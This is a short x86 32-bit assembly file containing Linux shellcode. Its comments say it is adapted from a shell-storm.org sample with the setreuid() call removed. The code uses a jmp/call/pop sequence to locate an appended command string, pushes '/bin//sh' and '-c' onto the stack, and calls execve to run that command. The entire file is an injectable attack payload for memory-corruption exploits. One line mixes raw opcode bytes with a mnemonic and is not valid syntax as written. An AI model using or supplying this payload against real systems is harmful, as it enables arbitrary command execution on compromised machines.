; Taken from:
;  http://www.shell-storm.org/shellcode/files/shellcode-216.php
;
;  And modified a bit, since I don't really need the setreuid() call.
bits 32

 jmp short bottom
top:
 pop edi
 push byte 0x0b
 pop eax
 cdq
 push edx
 push word 0x632d
 mov esi,esp
 push edx
 push dword 0x68732f2f
 push dword 0x6e69622f
 mov ebx,esp
 push edx
 push edi
 push esi
 push ebx
 mov ecx,esp
 int 0x80
bottom:
 e8daffffff        call top
 ; cmd goes here
